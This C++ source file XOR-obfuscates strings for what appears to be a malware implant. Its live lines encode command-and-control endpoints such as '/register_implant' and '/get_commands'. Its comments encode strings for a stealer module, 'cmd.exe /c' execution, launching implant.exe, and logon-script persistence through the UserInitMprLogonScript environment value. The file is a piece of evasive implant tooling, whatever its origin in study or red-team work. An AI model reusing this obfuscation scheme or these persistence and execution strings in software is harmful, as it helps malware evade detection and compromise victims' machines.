#include "xor.h"

int main(){
    /* Execute.cpp - key 0x28 */
    std::string s;
    std::string result;

    // s = "Execution";
    // result = xor_string(s, 0x28);
    // std::cout << result << std::endl;
    // result = xor_string("mPMK]\\AGF", 0x28);
    // std::cout << result << std::endl;
        s = "/get_commands";
    result = xor_string(s, 0x15);
    std::cout << result << std::endl;   
            s = "/register_implant";
    result = xor_string(s, 0x15);
    std::cout << result << std::endl;   
            s = "GABBAGOOL" ;
    result = xor_string(s, 0x15);
    std::cout << result << std::endl;   





    // Persistence
    // std::cout << xor_string("xMZ[A[\\MFKM",0x28) << std::endl;
    
    // /response_json
    // std::cout << xor_string("tZM[XGF[MwB[GF",0x28) << std::endl;

    // failed    
    // std::cout << xor_string("NIADML",0x28) << std::endl;
    
    // failure
    // std::cout << xor_string("NIAD]ZM",0x28) << std::endl;

    // No
    // std::cout << xor_string("fG",0x28) << std::endl;
   
    // executed
    // std::cout << xor_string("MPMK]\\ML",0x28) << std::endl;

    // success
    // std::cout << xor_string("[]KKM[[",0x28) << std::endl;


    // Situational_Awareness
    // std::cout << xor_string("{A\\]I\\AGFIDwi_IZMFM[[",0x28) << std::endl;

    // userName
    // std::cout << xor_string("][MZfIEM",0x28) << std::endl;

    // compName
    // std::cout << xor_string("KGEXfIEM",0x28) << std::endl;

    // ipName
    // std::cout << xor_string("AXfIEM",0x28) << std::endl;

    // Privileges
    // std::cout << xor_string("xZA^ADMOM[",0x28) << std::endl;

    // File_Enumeration
    // std::cout << xor_string("nADMwmF]EMZI\\AGF",0x28) << std::endl;

    // Stealer
    //std::cout << xor_string("z]LHEL[",0x29) << std::endl;
    
    // /response_stealer
    //std::cout << xor_string("\nW@VUJKV@zVQ@DI@W",0x25) << std::endl;
 
    // cmd.exe /c %s
    // std::cout << xor_string("vxq;pmp5:v50f",0x15) << std::endl;

    //NEXT
    //std::cout << xor_string("[PMA",0x15) << std::endl;
    
    //"@start \"c:\\users\\%s\\Downloads\\implant.exe\"\n"
    //std::cout << xor_string("Bqvcpv\" a8^wqgpq^'q^Fmulnmcfq^kornclv,gzg ^l",0x02) << std::endl;
    
    //C:\Batch
    //std::cout << xor_string("a8^@cvaj",0x02) << std::endl;

    //"c:\\Batch\\UserInitMprLogonScript.bat"
    //std::cout << xor_string("a8^@cvaj^WqgpKlkvOrpNmemlQapkrv,`cv",0x02) << std::endl;

    //     s = "@echo off\\n";
    // result = xor_string(s, 0x02);
    // std::cout << result << std::endl;

    //     s = "@pause\\n";
    // result = xor_string(s, 0x02);
    // std::cout << result << std::endl;
    //     s = "Environment";
    // result = xor_string(s, 0x02);
    // std::cout << result << std::endl;
    //     s = "UserInitMprLogonScript";
    // result = xor_string(s, 0x02);
    // std::cout << result << std::endl;
    // s = "c:\\test\\UserInitMprLogonScript.bat";
    // result = xor_string(s, 0x02);
    // std::cout << result << std::endl;
//     std::cout << xor_string("Bgajm\"mdd^l",0x02) << std::endl;
//     std::cout << xor_string("Brcwqg^l",0x02) << std::endl;
//     std::cout << xor_string("Gltkpmloglv",0x02) << std::endl;
//     std::cout << xor_string("WqgpKlkvOrpNmemlQapkrv",0x02) << std::endl;
    
// std::cout << xor_string("a8^vgqv^WqgpKlkvOrpNmemlQapkrv,`cv",0x02) << std::endl;

std::cout << xor_string(":rpaJvzxxt{qf",0x15) << std::endl;
std::cout << xor_string(":gpr|fapgJ|xeyt{a",0x15) << std::endl;
std::cout << xor_string("RTWWTRZZY",0x15) << std::endl;

    // std::string s = "Hello World!";
    // std::string result = xor_string(s, 0x42);
    // std::cout << result << std::endl;
}